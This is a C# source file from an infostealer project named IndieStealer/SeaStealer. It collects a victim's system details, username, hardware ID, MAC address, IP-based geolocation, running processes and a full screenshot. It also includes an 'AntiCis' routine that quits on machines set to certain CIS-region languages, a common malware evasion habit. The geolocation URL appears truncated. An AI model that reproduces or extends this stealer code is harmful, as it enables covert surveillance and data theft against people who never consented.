using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using System.Xml;
using Microsoft.VisualBasic.Devices;
using static IndieStealer.Collect.System.MachineMethods;

namespace IndieStealer.Collect.System
{
    class MachineInfo
    {
        public static Bitmap screenBitmap;
        public static List<ProcessElement> ProcessList;
        public static Machine sysData;
        public static string clipboard;
        public static void AllSystemData()
        {
            try
            {
                string systemLang = GetSystemLang();
                List<string> geoInfo = GeoInfo();  
                sysData = new Machine
                {
                    Title = "SeaStealer ~ System Info Log",
                    osVersion = GetOSInformation(),
                    CPU = GetProcessor(),
                    GPU = GetGpu(),
                    RAM = GetRAM(),
                    screenResolution = GetScreenRes(),
                    machineName = Environment.MachineName,
                    HWID = Info.Hwid,
                    Username = Environment.UserName,
                    ipAddress = geoInfo[0],
                    macAddress = GetMacAddress(),
                    Country = "[" + geoInfo[1] + "] " + geoInfo[2],
                    City = geoInfo[3],
                    Zip = geoInfo[4],
                    Lat = geoInfo[5],
                    Lon = geoInfo[6],
                    ISP = geoInfo[7],
                    currentDate = Info.DateNow + " (UTC " + Convert.ToString(Info.UTC) + ")",
                    systemLanguage = systemLang,
                    filePath = new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath,
                    processesCount = ProcessList?.Count.ToString() ?? Process.GetProcesses().Length.ToString()
                };
                if (Program.RunData.AntiCIS && AntiCis(CultureInfo.GetCultureInfo(systemLang).LCID))
                    Environment.Exit(0);

            }
            catch
            {}
        }



        private static bool AntiCis(int lcid)
        {
            switch (lcid)
            {
                case 1049:
                    return true;
                case 1087:
                    return true;
                case 1059:
                    return true;
                case 1067:
                    return true;
                case 1091:
                    return true;
                case 2092:
                    return true;
                case 1088:
                    return true;
                default:
                    return false;
            }
        
        }

        public static void CaptureScreen()
        {
            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
            screenBitmap = bitmap;
        }
                                                                                                
        public static void ListAllProcesses()
        {
            try
            {
                ProcessList = new List<ProcessElement>();
                foreach (ManagementObject instance in new ManagementClass("Win32_Process").GetInstances())
                {
                    ProcessList.Add(new ProcessElement() {Name = instance["Name"]?.ToString(), ID = instance["ProcessId"]?.ToString()});
                }
            }
            catch (Exception ex)
            { }
        }
        private static List<string> GeoInfo()
        {
            List<string> elements = new List<string>();
            try
            {
                HttpWebRequest webreq = (HttpWebRequest)WebRequest.Create("http:\\");
                using (WebResponse webresp = webreq.GetResponse())
                {
                    XmlDocument xml = new XmlDocument();
                    xml.LoadXml(new StreamReader(webresp.GetResponseStream()).ReadToEnd());
                    elements.Add(xml.GetElementsByTagName("query")[1].InnerText);                     
                    elements.Add(xml.GetElementsByTagName("countryCode")[0].InnerText);                     
                    elements.Add(xml.GetElementsByTagName("country")[0].InnerText);                     
                    elements.Add(xml.GetElementsByTagName("city")[0].InnerText);                     
                    elements.Add(xml.GetElementsByTagName("zip")[0].InnerText);                     
                    elements.Add(xml.GetElementsByTagName("lat")[0].InnerText);                    
                    elements.Add(xml.GetElementsByTagName("lon")[0].InnerText);                     
                    elements.Add(xml.GetElementsByTagName("isp")[0].InnerText); 
                }
                return elements;
            }
            catch 
            { }
            return new List<string>() { "Error", "Error", "", "Error", "Error", "Error", "Error", "Error" }; ;
            
        }
    }

    class ProcessElement
    {
        private string id;
        private string name;
        public string Name
        {
            get => "Name:\t" + name;
            set => name = value;
        }
        public string ID 
        { 
            get => "ID:\t" + id;
            set => id = value; 
        }
    }
}
